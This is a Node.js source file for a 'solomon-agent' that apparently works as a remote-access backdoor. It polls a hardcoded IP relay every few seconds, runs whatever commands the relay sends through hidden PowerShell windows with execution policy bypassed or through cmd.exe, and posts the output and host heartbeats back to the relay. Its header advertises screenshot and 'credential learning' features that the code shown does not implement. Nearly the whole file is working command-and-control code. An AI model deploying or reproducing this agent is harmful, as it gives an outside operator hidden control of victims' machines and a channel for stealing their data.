// solomon-agent v4.0 FIXED - Auto-Screenshot & Credential Learning
// FIXED: Added command timeout, error handling, and result posting
const https = require("https");
const http = require("http");
const { spawn, execSync } = require("child_process");
const os = require("os");
const fs = require("fs");
const path = require("path");
const RELAY_URL = "http://167.99.237.26:3001";
const AGENT_TOKEN = "0d029fb2-4feb-44d1-b2ad-a90521f0c264";
const POLL_INTERVAL = 3000;
const HEARTBEAT_INTERVAL = 15000;
const COMMAND_TIMEOUT = 30000;
let startTime = Date.now();
let activeProcesses = 0;
console.log("Solomon Agent v4.0.1-FIXED starting...");
function request(url, options) {
  options = options || {};
  return new Promise(function(resolve, reject) {
    var urlObj = new URL(url);
    var mod = urlObj.protocol === "https:" ? https : http;
    var body = options.body ? JSON.stringify(options.body) : null;
    var reqOptions = {
      hostname: urlObj.hostname,
      port: urlObj.port || (urlObj.protocol === "https:" ? 443 : 80),
      path: urlObj.pathname + urlObj.search,
      method: options.method || "GET",
      headers: {
        "Content-Type": "application/json",
        "x-agent-token": AGENT_TOKEN,
        "Content-Length": body ? Buffer.byteLength(body) : 0
      },
      timeout: 15000
    };
    var req = mod.request(reqOptions, function(res) {
      var data = "";
      res.on("data", function(chunk) { data += chunk; });
      res.on("end", function() {
        try { resolve({ status: res.statusCode, body: data ? JSON.parse(data) : {} }); }
        catch (e) { resolve({ status: res.statusCode, body: data }); }
      });
    });
    req.on("error", reject);
    req.on("timeout", function() { req.destroy(); reject(new Error("Request timeout")); });
    if (body) req.write(body);
    req.end();
  });
}
function executeCommand(command, type) {
  return new Promise(function(resolve) {
    activeProcesses++;
    var stdout = "";
    var stderr = "";
    var child;
    var resolved = false;
    function done(result) {
      if (resolved) return;
      resolved = true;
      activeProcesses--;
      resolve(result);
    }
    try {
      if (type === "powershell") {
        var psCommand = "$OutputEncoding = [System.Text.Encoding]::UTF8; [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; try { $host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(4096, 9999) } catch {}; " + command;
        child = spawn("powershell.exe", ["-NonInteractive", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", psCommand], { windowsHide: true });
      } else {
        child = spawn("cmd.exe", ["/c", "chcp 65001 > nul & " + command], { windowsHide: true });
      }
    } catch(spawnErr) {
      done({ output: "", error: spawnErr.message, exitCode: 1, screenshot: null });
      return;
    }
    var timer = setTimeout(function() {
      try { child.kill(); } catch(e) {}
      done({ output: "(timed out after 30s)", error: "", exitCode: 124, screenshot: null });
    }, COMMAND_TIMEOUT);
    child.stdout.on("data", function(data) { stdout += data.toString(); });
    child.stderr.on("data", function(data) { stderr += data.toString(); });
    child.on("close", function(code) {
      clearTimeout(timer);
      done({ output: stdout.trim(), error: stderr.trim(), exitCode: code, screenshot: null });
    });
    child.on("error", function(err) {
      clearTimeout(timer);
      done({ output: "", error: err.message, exitCode: 1, screenshot: null });
    });
  });
}
function pollAndExecute() {
  request(RELAY_URL + "/agent/poll").then(function(res) {
    if (res.status !== 200 || !res.body || !res.body.commands) return;
    var cmds = res.body.commands;
    cmds.forEach(function(cmd) {
      console.log("[EXEC] " + cmd.id + " | " + cmd.command.slice(0, 60));
      executeCommand(cmd.command, cmd.type || "powershell").then(function(result) {
        console.log("[RESULT] " + cmd.id.slice(0, 8) + " exit=" + result.exitCode + " out=" + result.output.slice(0, 50));
        return request(RELAY_URL + "/agent/result", {
          method: "POST",
          body: {
            id: cmd.id,
            output: result.output,
            error: result.error,
            exitCode: result.exitCode,
            screenshot: result.screenshot || undefined
          }
        });
      }).then(function(r) {
        console.log("[RESULT] Submitted " + cmd.id.slice(0, 8) + " status=" + r.status);
      }).catch(function(e) {
        console.error("[RESULT] Failed for " + cmd.id.slice(0, 8) + ":", e.message);
      });
    });
  }).catch(function(e) {
    if (e.message && e.message.indexOf("ECONNREFUSED") === -1) {
      console.error("[POLL] Error:", e.message);
    }
  });
}
setInterval(pollAndExecute, POLL_INTERVAL);
setInterval(function() {
  request(RELAY_URL + "/agent/heartbeat", {
    method: "POST",
    body: { agentId: os.hostname(), status: "online", version: "4.0.1-FIXED" }
  }).catch(function() {});
}, HEARTBEAT_INTERVAL);
console.log("Agent v4.0.1-FIXED running - polling every 3s with 30s timeout...");
